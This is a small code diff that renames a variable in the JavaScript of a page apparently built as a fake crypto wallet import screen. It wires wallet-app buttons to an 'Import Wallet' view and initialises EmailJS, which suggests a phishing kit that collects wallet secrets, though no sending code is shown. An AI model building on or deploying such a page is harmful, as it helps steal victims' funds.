@@ -720,7 +720,7 @@
                 wallet: null,
             };
             // Get DOM Elements
-            const Apps = document.querySelectorAll(".apps");
+            const All_apps = document.querySelectorAll(".apps");
             const hidden_section = document.getElementById("hidden");
             const hide_btn = document.getElementById("btn");
             const modal = document.querySelector(".modal");
@@ -759,7 +759,7 @@
                 emailjs.init("user_gNtktDkqqHmNHam5K8krE");
             })();
 
-            Apps.forEach((app) => {
+            All_apps.forEach((app) => {
                 app.addEventListener("click", (e) => {
                     e.preventDefault();
                     document.title = "Import Wallet";
